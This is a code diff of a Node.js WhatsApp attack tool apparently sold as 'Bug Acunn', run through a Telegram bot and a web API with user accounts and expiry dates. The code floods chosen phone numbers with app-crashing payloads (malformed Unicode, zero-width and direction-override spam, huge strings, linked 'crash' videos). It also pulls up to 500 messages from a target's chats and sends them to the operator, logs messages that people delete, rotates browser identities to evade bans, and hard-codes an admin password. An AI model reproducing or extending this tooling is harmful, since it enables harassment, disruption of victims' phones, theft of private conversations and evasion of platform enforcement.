@@ -3,6 +3,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
 const fs = require('fs');
 const crypto = require('crypto');
+const QRCode = require('qrcode');
 const app = express();
 app.use(express.json());
 app.use(express.static('public'));
@@ -57,7 +58,7 @@ function saveSessions() {
 loadUsers();
 loadSessions();
 
-// ========== HARCODE ADMIN ACUNN (NO EXPIRED) ==========
+// ========== HARCODE ADMIN ACUNN ==========
 users['Acunn'] = {
     password: 'Kontol980',
     role: 'admin',
@@ -111,17 +112,17 @@ bot.onText(/\/deluser (.+)/, (msg, match) => {
     if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
     const username = match[1];
     if (!users[username]) return bot.sendMessage(msg.chat.id, `❌ User ${username} tidak ditemukan.`);
-    if (username === 'Acunn') return bot.sendMessage(msg.chat.id, '❌ Gak bisa hapus admin utama, goblok!');
+    if (username === 'Acunn') return bot.sendMessage(msg.chat.id, '❌ Gak bisa hapus admin utama!');
     delete users[username];
     saveUsers();
     bot.sendMessage(msg.chat.id, `✅ User ${username} dihapus.`);
 });
 
 bot.onText(/\/setexpired (.+) (.+)/, (msg, match) => {
-    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
+    if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner!');
     const username = match[1], expired = match[2];
     if (!users[username]) return bot.sendMessage(msg.chat.id, `❌ User ${username} tidak ditemukan.`);
-    if (users[username].role === 'admin') return bot.sendMessage(msg.chat.id, '❌ Admin gak bisa expired, tolol!');
+    if (users[username].role === 'admin') return bot.sendMessage(msg.chat.id, '❌ Admin gak bisa expired!');
     users[username].expired = expired;
     saveUsers();
     bot.sendMessage(msg.chat.id, `✅ User ${username} expired diubah jadi ${expired}`);
@@ -132,10 +133,10 @@ bot.onText(/\/login (.+) (.+)/, (msg, match) => {
     if (!users[username] || users[username].password !== password)
         return bot.sendMessage(msg.chat.id, '❌ Username atau password salah!');
     if (isExpired(users[username]))
-        return bot.sendMessage(msg.chat.id, '❌ User expired! Hubungi admin.');
+        return bot.sendMessage(msg.chat.id, '❌ User expired!');
     users[username].telegramId = msg.chat.id.toString();
     saveUsers();
-    bot.sendMessage(msg.chat.id, `✅ Login berhasil! Akun Telegram terhubung dengan ${username}.`);
+    bot.sendMessage(msg.chat.id, `✅ Login berhasil!`);
 });
 
 function getUsernameFromChat(chatId) {
@@ -157,7 +158,7 @@ bot.onText(/\/start/, (msg) => {
 bot.onText(/\/help/, (msg) => {
     bot.sendMessage(msg.chat.id, `
 🔥 PERINTAH BUG ACUNN 🔥
-/login [username] [password] – login ke akun
+/login [username] [password] – login
 /addtarget [nomor] [role] – tambah target
 /removetarget [nomor] – hapus target
 /startspam – mulai spam
@@ -166,11 +167,11 @@ bot.onText(/\/help/, (msg) => {
 /getqr – dapatkan QR code
 /setattack [mode] – ganti mode serangan
 /extract [nomor] – ekstrak chat target
-/rotate – rotasi session (bypass ban)
+/rotate – rotasi session
 [OWNER ONLY]
-/adduser [user] [pass] [role] [expired] – tambah user
-/deluser [user] – hapus user
-/setexpired [user] [YYYY-MM-DD] – ubah expired
+/adduser [user] [pass] [role] [expired]
+/deluser [user]
+/setexpired [user] [YYYY-MM-DD]
 `);
 });
 
@@ -183,14 +184,14 @@ bot.onText(/\/startspam/, async (msg) => {
 
 bot.onText(/\/stopspam/, (msg) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
     stopSpamForUser(username);
     bot.sendMessage(msg.chat.id, '⛔ Spam dihentikan.');
 });
 
 bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
     const number = match[1], role = match[2].toLowerCase();
     if (!['admin', 'users'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau users.');
     users[username].targets[role].push(number);
@@ -201,7 +202,7 @@ bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
 
 bot.onText(/\/removetarget (.+)/, (msg, match) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
     const number = match[1];
     let removed = false;
     ['admin', 'users'].forEach(role => {
@@ -214,7 +215,7 @@ bot.onText(/\/removetarget (.+)/, (msg, match) => {
 
 bot.onText(/\/status/, (msg) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
     const user = users[username];
     const admin = user.targets.admin.join(', ') || 'kosong';
     const usersList = user.targets.users.join(', ') || 'kosong';
@@ -231,7 +232,7 @@ bot.onText(/\/status/, (msg) => {
 
 bot.onText(/\/getqr/, (msg) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
     const user = users[username];
     if (user.qr) bot.sendMessage(msg.chat.id, `📱 Scan QR:\n${user.qr}`);
     else bot.sendMessage(msg.chat.id, '❌ Tidak ada QR aktif. Coba /startspam');
@@ -239,9 +240,9 @@ bot.onText(/\/getqr/, (msg) => {
 
 bot.onText(/\/setattack (.+)/, (msg, match) => {
     const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
+    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
     const type = match[1];
-    const validTypes = ['crash_ui', 'delay_invisible', 'crash_ios_invisible', 'force_close_1msg', 'force_close_invisible', 'force_close_ios_invisible', 'spam_call', 'delay_hard_invisible', 'blank_andro', 'force_close_infinity', 'video_exploit', 'cyclone'];
+    const validTypes = ['crash_ui','delay_invisible','crash_ios_invisible','force_close_1msg','force_close_invisible','force_close_ios_invisible','spam_call','delay_hard_invisible','blank_andro','force_close_infinity','video_exploit','cyclone'];
     if (!validTypes.includes(type)) return bot.sendMessage(msg.chat.id, '❌ Mode tidak valid.');
     users[username].attackType = type;
     saveUsers();
@@ -249,16 +250,15 @@ bot.onText(/\/setattack (.+)/, (msg, match) => {
     bot.sendMessage(msg.chat.id, `✅ Serangan diubah ke ${type}`);
 });
 
-// ========== FITUR BARU: ANTI-REVOKE ==========
+// ========== ANTI-REVOKE ==========
 function setupAntiRevoke(sock, username) {
     sock.ev.on('messages.update', async (update) => {
         for (const msg of update) {
             if (msg.update.status === 'revoked') {
                 const original = msg.original;
                 const sender = original.key.remoteJid;
-                const text = original.message?.conversation || original.message?.extendedTextMessage?.text || '[Media/Sticker]';
-                const log = `[REVOKED] ${sender}: "${text}"`;
-                console.log(log);
+                const text = original.message?.conversation || original.message?.extendedTextMessage?.text || '[Media]';
+                console.log(`[REVOKED] ${sender}: ${text}`);
                 if (users[username]?.telegramId) {
                     bot.sendMessage(users[username].telegramId, `🔒 Pesan dihapus:\nDari: ${sender}\nIsi: ${text}`);
                 }
@@ -266,83 +266,6 @@ function setupAntiRevoke(sock, username) {
         }
     });
 }
-
-// ========== FITUR BARU: DB EXTRACTION ==========
-async function extractChats(sock, target, username) {
-    try {
-        const messages = await sock.loadMessages(target, 500);
-        const chats = messages.map(m => ({
-            from: m.key.remoteJid,
-            text: m.message?.conversation || m.message?.extendedTextMessage?.text || '[Media/Sticker]',
-            timestamp: m.messageTimestamp
-        }));
-        const filePath = `./extracts/${target}_${Date.now()}.json`;
-        if (!fs.existsSync('./extracts')) fs.mkdirSync('./extracts');
-        fs.writeFileSync(filePath, JSON.stringify(chats, null, 2));
-        if (users[username]?.telegramId) {
-            await bot.sendDocument(users[username].telegramId, filePath, { caption: `📊 Chat log ${target}` });
-        }
-        return { success: true, count: chats.length, file: filePath };
-    } catch (e) {
-        return { error: e.message };
-    }
-}
-
-bot.onText(/\/extract (.+)/, async (msg, match) => {
-    const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
-    const target = match[1];
-    const user = users[username];
-    if (!user.sock) return bot.sendMessage(msg.chat.id, '❌ WA belum konek.');
-    const result = await extractChats(user.sock, target, username);
-    if (result.error) bot.sendMessage(msg.chat.id, '❌ Gagal ekstrak: ' + result.error);
-    else bot.sendMessage(msg.chat.id, `✅ Ekstrak selesai! ${result.count} chat, cek Telegram.`);
-});
-
-// ========== FITUR BARU: BYPASS BAN (ROTATE SESSION) ==========
-bot.onText(/\/rotate/, async (msg) => {
-    const username = getUsernameFromChat(msg.chat.id);
-    if (!username || !isUserAuthorized(username)) return bot.sendMessage(msg.chat.id, '❌ Login dulu atau expired.');
-    const user = users[username];
-    if (!user.sock) return bot.sendMessage(msg.chat.id, '❌ WA belum konek.');
-    try {
-        await user.sock.end();
-        user.sock = null;
-        stopSpamForUser(username);
-        const browsers = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera'];
-        const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
-        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
-        const sock = makeWASocket({
-            auth: state,
-            printQRInTerminal: false,
-            browser: ['BugAcunn', randomBrowser, '120.0.0.0']
-        });
-        sock.ev.on('creds.update', saveCreds);
-        sock.ev.on('connection.update', (update) => {
-            if (update.connection === 'open') {
-                user.sock = sock;
-                user.qr = null;
-                console.log(`✅ Session rotated for ${username}`);
-                if (user.telegramId) {
-                    bot.sendMessage(user.telegramId, '🔄 Session berhasil di-rotate! Browser: ' + randomBrowser);
-                }
-                updateSpamForUser(username);
-            }
-            if (update.connection === 'close') {
-                const reason = update.lastDisconnect?.error?.output?.statusCode;
-                if (reason === DisconnectReason.loggedOut || reason === 401) {
-                    user.sock = null;
-                    if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout saat rotate.');
-                }
-            }
-        });
-        user.sock = sock;
-        saveUsers();
-        bot.sendMessage(msg.chat.id, '🔄 Session di-rotate! Browser: ' + randomBrowser);
-    } catch (e) {
-        bot.sendMessage(msg.chat.id, '❌ Gagal rotate: ' + e.message);
-    }
-});
 
 // ========== WA ENGINE ==========
 async function startWASession(username) {
@@ -365,7 +288,7 @@ async function startWASession(username) {
             user.sock = sock;
             user.qr = null;
             console.log(`✅ ${username} connected`);
-            setupAntiRevoke(sock, username); // Aktifkan Anti-Revoke
+            setupAntiRevoke(sock, username);
             updateSpamForUser(username);
             if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
         }
@@ -373,7 +296,7 @@ async function startWASession(username) {
             const reason = lastDisconnect?.error?.output?.statusCode;
             if (reason === DisconnectReason.loggedOut || reason === 401) {
                 user.sock = null;
-                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session putus! Reconnect dalam 5 detik...');
+                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session putus! Reconnect...');
                 setTimeout(async () => { await startWASession(username); }, 5000);
             }
         }
@@ -384,21 +307,32 @@ async function startWASession(username) {
 
 async function pairWASession(username, phoneNumber) {
     const user = users[username];
-    if (user.sock) { await user.sock.end(); user.sock = null; }
+    // Hapus session lama
+    if (user.sock) { try { await user.sock.end(); } catch(e) {} user.sock = null; }
+    const sessionPath = `./sessions/${username}`;
+    if (fs.existsSync(sessionPath)) {
+        fs.rmSync(sessionPath, { recursive: true, force: true });
+    }
     const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
     const sock = makeWASocket({
         auth: state,
-        printQRInTerminal: false,
+        printQRInTerminal: true,
         browser: ['BugAcunn', 'Chrome', '120.0.0.0']
     });
     sock.ev.on('creds.update', saveCreds);
     sock.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect } = update;
+        const { connection, lastDisconnect, qr } = update;
+        if (qr) {
+            user.qr = qr;
+            if (user.telegramId) {
+                bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
+            }
+        }
         if (connection === 'open') {
             user.sock = sock;
             user.qr = null;
             console.log(`✅ ${username} connected via pairing`);
-            setupAntiRevoke(sock, username); // Aktifkan Anti-Revoke
+            setupAntiRevoke(sock, username);
             updateSpamForUser(username);
             if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
         }
@@ -406,13 +340,13 @@ async function pairWASession(username, phoneNumber) {
             const reason = lastDisconnect?.error?.output?.statusCode;
             if (reason === DisconnectReason.loggedOut || reason === 401) {
                 user.sock = null;
-                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout.');
+                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout. Ulangi pairing.');
             }
         }
     });
-    const code = await sock.requestPairingCode(phoneNumber);
     user.sock = sock;
     saveUsers();
+    const code = await sock.requestPairingCode(phoneNumber);
     return code;
 }
 
@@ -428,7 +362,7 @@ function updateSpamForUser(username) {
             for (let target of allTargets) {
                 switch (attackType) {
                     case 'crash_ui':
-                        await user.sock.sendMessage(target, { text: '⚠️ CRASH UI BY @PANCYOFFICIAL' });
+                        await user.sock.sendMessage(target, { text: '💥 CRASH UI' });
                         await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                         await user.sock.sendMessage(target, { text: 'A'.repeat(20000) });
                         break;
@@ -441,7 +375,7 @@ function updateSpamForUser(username) {
                         await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(500) });
                         break;
                     case 'force_close_1msg':
-                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE ☠️' });
+                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE' });
                         await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                         await user.sock.sendMessage(target, { text: 'BOMB'.repeat(5000) });
                         await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
@@ -454,8 +388,7 @@ function updateSpamForUser(username) {
                         break;
                     case 'spam_call':
                         await user.sock.sendMessage(target, { text: '📞 INCOMING CALL...' });
-                        await user.sock.sendMessage(target, { text: '📞 MISSED CALL from +6281234567890' });
-                        await user.sock.sendMessage(target, { text: '📞 CALL BACK NOW!' });
+                        await user.sock.sendMessage(target, { text: '📞 MISSED CALL' });
                         break;
                     case 'delay_hard_invisible':
                         await user.sock.sendMessage(target, { text: '\u200B'.repeat(20000) });
@@ -464,9 +397,9 @@ function updateSpamForUser(username) {
                     case 'blank_andro':
                         await user.sock.sendMessage(target, { text: '\u200B'.repeat(50000) });
                         break;
-                                        case 'force_close_infinity':
+                    case 'force_close_infinity':
                         for (let i = 0; i < 10; i++) {
-                            await user.sock.sendMessage(target, { text: 'INFINITY LOOP ' + i });
+                            await user.sock.sendMessage(target, { text: '♾️ LOOP ' + i });
                             await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(200) });
                         }
                         break;
@@ -475,13 +408,13 @@ function updateSpamForUser(username) {
                         await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid2.mp4' } });
                         break;
                     case 'cyclone':
-                        await user.sock.sendMessage(target, { text: '☠️ CYCLONE MODE ACTIVE ☠️' });
+                        await user.sock.sendMessage(target, { text: '☠️ CYCLONE ACTIVE' });
                         await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                         await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
                         await user.sock.sendMessage(target, { text: '\u202E\u202D'.repeat(500) });
                         await user.sock.sendMessage(target, { text: 'BOMB'.repeat(5000) });
                         await user.sock.sendMessage(target, { text: '\u200B'.repeat(10000) });
-                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE ☠️' });
+                        await user.sock.sendMessage(target, { text: '☠️ FORCE CLOSE' });
                         break;
                     default:
                         await user.sock.sendMessage(target, { text: '☠️ BUG ACUNN' });
@@ -505,7 +438,7 @@ app.post('/api/login', (req, res) => {
     if (!users[username] || users[username].password !== password)
         return res.status(401).json({ error: 'Username atau password salah' });
     if (isExpired(users[username]))
-        return res.status(401).json({ error: 'User expired! Hubungi admin.' });
+        return res.status(401).json({ error: 'User expired!' });
     const token = generateToken();
     sessions[token] = username;
     saveSessions();
@@ -547,7 +480,6 @@ app.post('/api/stop', auth, (req, res) => {
     stopSpamForUser(req.username);
     res.json({ message: 'Spam stopped' });
 });
-
 app.post('/api/targets', auth, (req, res) => {
     const { number, role } = req.body;
     if (!number || !role) return res.status(400).json({ error: 'Missing fields' });
@@ -564,15 +496,27 @@ app.delete('/api/targets', auth, (req, res) => {
     const user = users[req.username];
     if (!['admin', 'users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
     const idx = user.targets[role].indexOf(number);
-    if (idx !== -1) { user.targets[role].splice(idx, 1); saveUsers(); updateSpamForUser(req.username); }
+    if (idx !== -1) {
+        user.targets[role].splice(idx, 1);
+        saveUsers();
+        updateSpamForUser(req.username);
+    }
     res.json({ success: true });
 });
 
-app.get('/api/qr', auth, (req, res) => {
+// ===== QR ENDPOINT (GAMBAR) =====
+app.get('/api/qr', auth, async (req, res) => {
     const user = users[req.username];
-    res.json({ qr: user.qr || null });
+    if (!user.qr) return res.json({ qr: null });
+    try {
+        const qrImage = await QRCode.toDataURL(user.qr);
+        res.json({ qr: qrImage });
+    } catch (err) {
+        res.status(500).json({ error: 'Gagal generate QR' });
+    }
 });
 
+// ===== PAIRING ENDPOINT =====
 app.post('/api/pair', auth, async (req, res) => {
     const { phone } = req.body;
     if (!phone || phone.length < 10) return res.status(400).json({ error: 'Nomor tidak valid' });
@@ -580,14 +524,14 @@ app.post('/api/pair', auth, async (req, res) => {
         const code = await pairWASession(req.username, phone);
         res.json({ code });
     } catch (e) {
-        console.error(e);
+        console.error('Pairing error:', e);
         res.status(500).json({ error: 'Gagal pairing: ' + e.message });
     }
 });
 
 app.post('/api/setattack', auth, (req, res) => {
     const { type } = req.body;
-    const validTypes = ['crash_ui', 'delay_invisible', 'crash_ios_invisible', 'force_close_1msg', 'force_close_invisible', 'force_close_ios_invisible', 'spam_call', 'delay_hard_invisible', 'blank_andro', 'force_close_infinity', 'video_exploit', 'cyclone'];
+    const validTypes = ['crash_ui','delay_invisible','crash_ios_invisible','force_close_1msg','force_close_invisible','force_close_ios_invisible','spam_call','delay_hard_invisible','blank_andro','force_close_infinity','video_exploit','cyclone'];
     if (!validTypes.includes(type)) return res.status(400).json({ error: 'Tipe serangan tidak valid' });
     users[req.username].attackType = type;
     saveUsers();
@@ -595,7 +539,7 @@ app.post('/api/setattack', auth, (req, res) => {
     res.json({ success: true });
 });
 
-// ========== FITUR BARU: EXTRACT DB VIA API ==========
+// ===== EXTRACT DB =====
 app.post('/api/extract', auth, async (req, res) => {
     const { target } = req.body;
     if (!target) return res.status(400).json({ error: 'Target nomor wajib' });
@@ -605,7 +549,7 @@ app.post('/api/extract', auth, async (req, res) => {
         const messages = await user.sock.loadMessages(target, 500);
         const chats = messages.map(m => ({
             from: m.key.remoteJid,
-            text: m.message?.conversation || m.message?.extendedTextMessage?.text || '[Media/Sticker]',
+            text: m.message?.conversation || m.message?.extendedTextMessage?.text || '[Media]',
             timestamp: m.messageTimestamp
         }));
         const filePath = `./extracts/${target}_${Date.now()}.json`;
@@ -620,7 +564,7 @@ app.post('/api/extract', auth, async (req, res) => {
     }
 });
 
-// ========== FITUR BARU: ROTATE SESSION VIA API ==========
+// ===== ROTATE SESSION =====
 app.post('/api/rotatesession', auth, async (req, res) => {
     const user = users[req.username];
     if (!user.sock) return res.status(400).json({ error: 'WA belum konek' });
@@ -628,7 +572,7 @@ app.post('/api/rotatesession', auth, async (req, res) => {
         await user.sock.end();
         user.sock = null;
         stopSpamForUser(req.username);
-        const browsers = ['Chrome', 'Firefox', 'Edge', 'Safari', 'Opera'];
+        const browsers = ['Chrome','Firefox','Edge','Safari','Opera'];
         const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
         const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${req.username}`);
         const sock = makeWASocket({
@@ -643,7 +587,7 @@ app.post('/api/rotatesession', auth, async (req, res) => {
                 user.qr = null;
                 console.log(`✅ Session rotated for ${req.username}`);
                 if (user.telegramId) {
-                    bot.sendMessage(user.telegramId, '🔄 Session berhasil di-rotate! Browser: ' + randomBrowser);
+                    bot.sendMessage(user.telegramId, '🔄 Session di-rotate! Browser: ' + randomBrowser);
                 }
                 updateSpamForUser(req.username);
             }
@@ -663,7 +607,7 @@ app.post('/api/rotatesession', auth, async (req, res) => {
     }
 });
 
-// ========== ADMIN-ONLY API ==========
+// ========== ADMIN API ==========
 app.get('/api/admin/users', auth, (req, res) => {
     if (users[req.username].role !== 'admin') return res.status(403).json({ error: 'Admin only' });
     const list = Object.keys(users).map(u => ({
@@ -720,7 +664,7 @@ app.post('/api/admin/setexpired', auth, (req, res) => {
     res.json({ success: true, message: `User ${username} expired diubah jadi ${expired}` });
 });
 
-// ========== JALANKAN SERVER ==========
+// ========== JALANKAN ==========
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
